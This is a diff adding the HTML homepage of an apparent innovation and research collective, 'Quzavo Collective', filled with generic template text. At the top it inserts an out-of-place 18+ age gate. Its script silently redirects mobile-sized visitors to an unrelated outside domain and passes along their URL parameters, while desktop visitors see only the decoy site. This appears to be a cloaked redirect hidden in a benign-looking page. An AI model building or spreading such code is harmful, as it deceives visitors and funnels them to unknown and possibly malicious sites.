@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en-US">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="x-ua-compatible" content="IE=edge">
+  <meta name="author" content="SemiColonWeb">
+  <meta name="description"
+    content="Create Academic Websites with Canvas Template. Get Canvas to build powerful websites easily with the Highly Customizable &amp; Best Selling Bootstrap Template, today.">
+  <link rel="icon" type="image/png" href="/favicon.ico">
+  <link rel="stylesheet" href="https://use.typekit.net/mym7qil.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="stylesheet" href="/assets/css/font-icons.css">
+  <link rel="stylesheet" href="/assets/css/academic.css">
+  <link rel="stylesheet" href="/assets/css/custom.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Home</title>
+</head>
+
+<body class="age-gate-active">
+
+<!-- AGE GATE -->
+<div id="age-gate-overlay">
+  <div class="age-gate-card">
+    <div class="age-gate-badge">18+</div>
+    <h2 class="age-gate-title">Confirm Your Age</h2>
+    <p class="age-gate-text">
+      This website is only for persons over 18 years old.
+    </p>
+    <button id="age-gate-confirm" class="age-gate-btn">
+      Yes, I am 18+
+    </button>
+  </div>
+</div>
+
+<style>
+html.age-gate-active,
+body.age-gate-active {
+  overflow: hidden;
+}
+
+body.age-gate-active > *:not(#age-gate-overlay) {
+  display: none;
+}
+
+/* Overlay Background */
+#age-gate-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: linear-gradient(#0f172a, #020617);
+  font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  padding: 20px;
+}
+
+/* Centered Content Card */
+.age-gate-card {
+  background-color: #1e293b; /* Solid dark slate box to separate from background */
+  padding: 40px 30px;
+  border-radius: 16px;
+  text-align: center;
+  max-width: 400px;
+  width: 100%;
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+  border: 1px solid #334155;
+}
+
+/* Typography & Visual Elements */
+.age-gate-badge {
+  font-size: 2rem;
+  font-weight: 800;
+  color: #22c55e; /* Green accent color */
+  margin-bottom: 15px;
+}
+
+.age-gate-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  color: #ffffff !important; /* Forces text visibility */
+  margin-bottom: 10px;
+}
+
+.age-gate-text {
+  font-size: 1rem;
+  color: #94a3b8 !important; /* Muted silver/gray text */
+  margin-bottom: 30px;
+  line-height: 1.5;
+}
+
+/* Explicitly Styled Green Button */
+.age-gate-btn {
+  background-color: #22c55e !important; /* Pure vibrant green */
+  color: #000000 !important;
+  font-weight: 700 !important;
+  font-size: 1rem !important;
+  padding: 14px 28px;
+  border-radius: 8px;
+  border: none !important;
+  width: 100%;
+  cursor: pointer;
+  transition: background-color 0.2s ease, transform 0.1s ease;
+}
+
+.age-gate-btn:hover {
+  background-color: #16a34a !important; /* Slightly darker green on hover */
+}
+
+.age-gate-btn:active {
+  transform: scale(0.98);
+}
+</style>
+
+<script>
+(function () {
+
+  var MOBILE_REDIRECT_URL = "https://noviqox.com/ukjun/";
+
+  function isMobile() {
+    return window.innerWidth <= 768;
+  }
+
+  function redirectWithParams(url) {
+    var current = new URL(window.location.href);
+    var target = new URL(url);
+
+    current.searchParams.forEach(function (value, key) {
+      target.searchParams.set(key, value);
+    });
+
+    if (current.hash) {
+      target.hash = current.hash;
+    }
+
+    window.location.href = target.toString();
+  }
+
+  function openGate() {
+    document.documentElement.classList.add("age-gate-active");
+    document.body.classList.add("age-gate-active");
+  }
+
+  function closeGate() {
+    document.documentElement.classList.remove("age-gate-active");
+    document.body.classList.remove("age-gate-active");
+    document.getElementById("age-gate-overlay").style.display = "none";
+  }
+
+  function init() {
+    var btn = document.getElementById("age-gate-confirm");
+    if (!btn) return;
+
+    openGate();
+
+    btn.onclick = function () {
+      if (isMobile()) {
+        redirectWithParams(MOBILE_REDIRECT_URL);
+      } else {
+        closeGate();
+      }
+    };
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+
+})();
+</script>
+
+  <div id="homepageContainer">
+    <button type="button" class="btn btn-dark body-scheme-toggle"
+      data-bodyclass-toggle="dark"
+      data-add-class="btn-warning"
+      data-remove-class="btn-dark"
+      data-add-html="<i class='bi-brightness-high'></i><span class='visually-hidden'>Light Mode</span>"
+      data-remove-html="<i class='bi-moon-stars'></i><span class='visually-hidden'>Dark Mode</span>">
+      <span class="visually-hidden">Dark Toggle</span>
+    </button>
+    <!-- Document Wrapper-->
+    <div id="wrapper">
+      <header id="header">
+        <div id="header-wrap" class="border-0">
+          <div class="container">
+            <div class="header-row justify-content-lg-between px-4 px-xl-0">
+              <!-- Logo -->
+              <div class="order-1 order-lg-1 text-lg-center p-lg-4 py-3 mt-lg-5">
+                <a href="/">
+                  <img src="/assets/images/logo.webp" alt="Canvas Logo"
+                    class=" mb-lg-3 d-none d-lg-inline-block img-fluid"
+                    style="max-width: 150px; height: auto;">
+                </a>
+                <div>
+                  <p class="mb-0 op-06 fw-light">Where innovation meets excellence.</p>
+                </div>
+              </div>
+              <div class="primary-menu-trigger order-3 order-lg-2 ms-auto ms-sm-3">
+                <button class="cnvs-hamburger" type="button" title="Open Mobile Menu">
+                  <span class="cnvs-hamburger-box"><span class="cnvs-hamburger-inner"></span></span>
+                </button>
+              </div>
+              <!-- Primary Navigation -->
+              <nav class="primary-menu order-last order-lg-2">
+                <ul class="menu-container one-page-menu" data-easing="easeInOutExpo" data-speed="1250" data-offset="0">
+                  <li class="menu-item"><a class="menu-link" href="/#section-about">
+                      <div><i class=""></i> About</div>
+                    </a></li>
+                  <li class="menu-item"><a class="menu-link" href="/#section-works">
+                      <div><i class=""></i> Works</div>
+                    </a></li>
+                  <li class="menu-item"><a class="menu-link" href="/#section-experience">
+                      <div><i class=""></i> Experience</div>
+                    </a></li>
+                  <li class="menu-item"><a class="menu-link" href="/#section-journal">
+                      <div><i class=""></i> Journal</div>
+                    </a></li>
+                  <li class="menu-item"><a class="menu-link" href="/#section-research">
+                      <div><i class=""></i> Research</div>
+                    </a></li>
+                  <li class="menu-item"><a class="menu-link" href="/#section-contact">
+                      <div><i class=""></i> Contact</div>
+                    </a></li>
+                </ul>
+              </nav>
+            </div>
+          </div>
+        </div>
+        <div class="header-wrap-clone"></div>
+      </header>
+
+      <!-- Content -->
+      <section id="content">
+        <div class="content-wrap py-lg-0 pt-0">
+
+          <!-- About Section -->
+          <div id="section-about" class="page-section py-5 py-lg-6">
+            <div class="container mw-md pt-lg-3">
+              <div class="row align-items-center justify-content-between">
+                <div class="col-md-5">
+                  <p class="text-uppercase ls-2 fw-bold color">- BIO</p>
+                  <h2 class="display-2 fw-bolder text-uppercase ls-2">Quzavo Collective</h2>
+                  <blockquote class="fs-6 border-color">
+                    <p>Pioneering new frontiers in creativity, research, and real-world innovation.</p>
+                    <footer class="blockquote-footer font-monospace mb-0">Quzavo Team</footer>
+                  </blockquote>
+                </div>
+                <div class="col-md-6">
+                  <img src="/assets/images/person-1.png" alt="Canvas Logo">
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Works Section -->
+          <div id="section-works" class="py-lg-5 page-section">
+            <div class="container mw-md">
+              <h2 class="text-center display-3 fw-semibold ls-2 mb-5">
+                <i class="bi-briefcase color"></i> Works
+              </h2>
+              <div class="row gy-5">
+                <div class="col-12">
+                  <div class="row g-4 gx-5 align-items-center">
+                    <div class="col-md-6">
+                      <img src="&#x2F;assets&#x2F;images&#x2F;works&#x2F;1.jpg" alt=".." class="rounded-2">
+                    </div>
+                    <div class="col-md-6">
+                      <h3 class="mb-2">Designing Tomorrow.</h3>
+                      <p>Implementing sustainable design solutions to meet future challenges.</p>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="row g-4 gx-5 align-items-center">
+                    <div class="col-md-6">
+                      <img src="&#x2F;assets&#x2F;images&#x2F;works&#x2F;2.jpg" alt=".." class="rounded-2">
+                    </div>
+                    <div class="col-md-6">
+                      <h3 class="mb-2">The Innovation Mindset.</h3>
+                      <p>Exploring the mental frameworks that drive revolutionary ideas.</p>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="row g-4 gx-5 align-items-center">
+                    <div class="col-md-6">
+                      <img src="&#x2F;assets&#x2F;images&#x2F;works&#x2F;3.jpg" alt=".." class="rounded-2">
+                    </div>
+                    <div class="col-md-6">
+                      <h3 class="mb-2">Blueprints for Change.</h3>
+                      <p>Developing strategic initiatives for organizational transformation.</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Experience Section -->
+          <div id="section-experience" class="py-lg-5 page-section">
+            <div class="container mw-md">
+              <h2 class="text-center display-3 fw-semibold ls-2 mb-5">
+                <i class="bi-person-gear color"></i> Experience
+              </h2>
+              <div class="row justify-content-center text-start">
+                <div class="col-3">
+                  <p class="mb-2 small">Dec 2022 ─ Present</p>
+                </div>
+                <div class="col-9">
+                  <p>Leading projects that bridge technology, creativity, and community impact.</p>
+                </div>
+                <div class="clear"></div>
+                <div class="col-3">
+                  <p class="mb-2 small">Mar 2021 ─ Dec 2022</p>
+                </div>
+                <div class="col-9">
+                  <p>Headed research initiatives in applied innovation methodologies.</p>
+                </div>
+                <div class="clear"></div>
+                <div class="col-3">
+                  <p class="mb-2 small">Feb 2019 ─ Mar 2021</p>
+                </div>
+                <div class="col-9">
+                  <p>Collaborated with interdisciplinary teams to solve complex global issues.</p>
+                </div>
+                <div class="clear"></div>
+                <div class="col-3">
+                  <p class="mb-2 small">Jan 2017 ─ Feb 2019</p>
+                </div>
+                <div class="col-9">
+                  <p>Launched educational programs promoting creative thinking in business sectors.</p>
+                </div>
+                <div class="clear"></div>
+              </div>
+            </div>
+          </div>
+          <!-- Journal Section -->
+          <div id="section-journal" class="py-lg-5 page-section">
+            <div class="container mw-md">
+              <h2 class="text-center display-3 fw-semibold ls-2 mb-5">
+                <i class="bi-journal-text color"></i> Journal
+              </h2>
+              <div class="row gy-4">
+                <div class="col-12">
+                  <div class="card bg-contrast-100 rounded-1 border-0">
+                    <div class="card-body p-4">
+                      <div class="toggle mb-0">
+                        <div class="toggle-header d-block">
+                          <div class="d-flex w-100 justify-content-between align-items-center">
+                            <div>
+                              <div class="toggle-title fs-4 mb-2">The Rise of Systems Innovation</div>
+                              <div class="small fw-normal mb-2 op-06">Quzavo Research Team (2025)</div>
+                            </div>
+                            <div class="text-muted small">
+                              <i class="bi bi-chevron-down me-1"></i>Click to expand
+                            </div>
+                          </div>
+                        </div>
+                        <div class="toggle-content">
+                          <div class="mt-4 border-top pt-4">
+                            Analyzing the growing influence of systems-based thinking on modern innovation models. This paper explores how integrated frameworks and feedback loops empower organizations to navigate complexity, adapt to change, and foster holistic value creation across disciplines and industries.
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="card bg-contrast-100 rounded-1 border-0">
+                    <div class="card-body p-4">
+                      <div class="toggle mb-0">
+                        <div class="toggle-header d-block">
+                          <div class="d-flex w-100 justify-content-between align-items-center">
+                            <div>
+                              <div class="toggle-title fs-4 mb-2">Networks of Change</div>
+                              <div class="small fw-normal mb-2 op-06">Quzavo Research Team (2025)</div>
+                            </div>
+                            <div class="text-muted small">
+                              <i class="bi bi-chevron-down me-1"></i>Click to expand
+                            </div>
+                          </div>
+                        </div>
+                        <div class="toggle-content">
+                          <div class="mt-4 border-top pt-4">
+                            Exploring how interconnected efforts drive meaningful societal transformation. The study highlights examples of collaborative ecosystems, the diffusion of innovation through social networks, and the catalytic role of digital infrastructure in accelerating cross-sector partnerships.
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="card bg-contrast-100 rounded-1 border-0">
+                    <div class="card-body p-4">
+                      <div class="toggle mb-0">
+                        <div class="toggle-header d-block">
+                          <div class="d-flex w-100 justify-content-between align-items-center">
+                            <div>
+                              <div class="toggle-title fs-4 mb-2">Future-Proof Collaboration</div>
+                              <div class="small fw-normal mb-2 op-06">Quzavo Research Team (2025)</div>
+                            </div>
+                            <div class="text-muted small">
+                              <i class="bi bi-chevron-down me-1"></i>Click to expand
+                            </div>
+                          </div>
+                        </div>
+                        <div class="toggle-content">
+                          <div class="mt-4 border-top pt-4">
+                            Designing resilient systems for interdisciplinary collaboration in uncertain times. Through case studies and systems mapping, the research outlines methods to enable durable partnerships, shared language development, and trust-building mechanisms within volatile environments.
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12">
+                  <div class="card bg-contrast-100 rounded-1 border-0">
+                    <div class="card-body p-4">
+                      <div class="toggle mb-0">
+                        <div class="toggle-header d-block">
+                          <div class="d-flex w-100 justify-content-between align-items-center">
+                            <div>
+                              <div class="toggle-title fs-4 mb-2">Strategic Foresight in Action</div>
+                              <div class="small fw-normal mb-2 op-06">Quzavo Research Team (2025)</div>
+                            </div>
+                            <div class="text-muted small">
+                              <i class="bi bi-chevron-down me-1"></i>Click to expand
+                            </div>
+                          </div>
+                        </div>
+                        <div class="toggle-content">
+                          <div class="mt-4 border-top pt-4">
+                            Applying foresight techniques to build future-ready organizational strategies. This journal explores scenario planning, trend analysis, and speculative design as tools for navigating ambiguity, enabling leaders to anticipate disruption and craft adaptive strategies with long-term impact.
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!-- Research Section -->
+          <div id="section-research" class="py-lg-5 page-section">
+            <div class="container mw-md">
+              <h2 class="text-center display-3 fw-semibold ls-2 mb-5 mb-lg-6">
+                <i class="bi-binoculars color"></i> Research
+              </h2>
+              <div class="row">
+                <div class="col-md-6">
+                  <h3 class="border-bottom border-color border-width-3 d-inline-block">Research Summary</h3>
+                  <p class="lead mb-2">Research for a dynamic future.</p>
+                  <p>Our work focuses on integrating innovative thinking into real-world applications, spanning creative design, systems innovation, and strategic foresight.</p>
+                </div>
+                <div class="col-md-6">
+                  <h3 class="border-bottom border-color border-width-3 d-inline-block">Interests</h3>
+                  <div class="row g-2">
+                    <div class="col-auto">
+                      <div class="small rounded-pill border px-4 py-2">Strategic Innovation</div>
+                    </div>
+                    <div class="col-auto">
+                      <div class="small rounded-pill border px-4 py-2">Systems Thinking</div>
+                    </div>
+                    <div class="col-auto">
+                      <div class="small rounded-pill border px-4 py-2">Collaborative Research</div>
+                    </div>
+                    <div class="col-auto">
+                      <div class="small rounded-pill border px-4 py-2">Creative Methodologies</div>
+                    </div>
+                    <div class="col-auto">
+                      <div class="small rounded-pill border px-4 py-2">Future Studies</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Contact Section -->
+          <div id="section-contact" class="py-lg-5 page-section">
+            <div class="container mw-md">
+              <h2 class="text-center display-3 fw-semibold ls-2 mb-5 mb-lg-6">
+                <i class="bi-envelope-open color"></i> Contact
+              </h2>
+              <div class="row g-5">
+                <div class="col-md-6">
+                  <div class="row gy-5">
+                    <div class="col-12">
+                      <h4 class="border-bottom border-color border-width-3 d-inline-block">We would love to hear from you.</h4>
+                      <address class="mb-4">
+                        795 Folsom Ave, Suite 600<br>
+                        San Francisco, CA 94107<br>
+                      </address>
+                      <div class="d-flex mb-1"><strong class="col-3">Email:</strong> contact@quzavo.com</div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6" style="font-family: Arial, sans-serif;">
+                  <form id="contact-form" style="display: flex; flex-direction: column; gap: 12px; padding: 20px; border: 1px solid #ccc; border-radius: 8px;">
+
+                    <label for="name" style="font-weight: bold;">Name *</label>
+                    <input type="text" id="name" required style="padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
+
+                    <label for="email" style="font-weight: bold;">Email *</label>
+                    <input type="email" id="email" required style="padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
+
+                    <label for="subject" style="font-weight: bold;">Subject *</label>
+                    <input type="text" id="subject" required style="padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
+
+                    <label for="message" style="font-weight: bold;">Message *</label>
+                    <textarea id="message" rows="4" required style="padding: 8px; border: 1px solid #ccc; border-radius: 4px;"></textarea>
+
+                    <button type="submit" style="padding: 10px; background-color: #FFC107; color: gray; border: none; border-radius: 4px; cursor: pointer;">
+                      Send Message
+                    </button>
+                  </form>
+
+                  <p id="thank-you" style="display: none; margin-top: 15px; color: green; font-weight: bold; text-align: center;">
+                    Thank you for your message!
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- Footer -->
+      <footer id="footer" class="bg-contrast-0 border-width-1">
+        <div id="copyrights" class="bg-color">
+          <div class="container">
+            <p class="mb-0 text-center text-dark text-opacity-75">
+              Copyrights © 2026 All Rights Reserved.
+            </p>
+            <nav class="mt-3 text-center">
+              <a href="/privacy/" class="text-dark text-opacity-75 mx-2">Privacy Policy</a>
+              <a href="/terms/" class="text-dark text-opacity-75 mx-2">Terms and Conditions</a>
+              <a href="/cookies/" class="text-dark text-opacity-75 mx-2">Cookies Policy</a>
+            </nav>
+
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <!-- Cookie Consent -->
+    <div id="cookie-consent" class="position-fixed bottom-0 end-0 bg-dark text-white p-3 rounded shadow-lg"
+      style="z-index: 9999; max-width: 320px; margin: 1rem;">
+      <div class="me-3">
+        <span class="d-block mb-2 small">We use cookies to ensure you get the best experience on our website.</span>
+        <a href="&#x2F;cookies&#x2F;" class="text-warning text-decoration-underline small">Learn more</a>
+      </div>
+      <button id="accept-cookies" class="btn btn-sm btn-warning mt-2 w-100">Accept</button>
+    </div>
+
+    <!-- Go To Top -->
+    <div id="gotoTop" class="uil uil-angle-up"></div>
+  </div>
+
+  <!-- JavaScripts -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mustache.js/3.0.1/mustache.min.js"></script>
+  <script src="/assets/js/main.js"></script>
+  <script src="/assets/js/plugins.min.js"></script>
+  <script src="/assets/js/functions.bundle.js"></script>
+
+</body>
+
+</html>
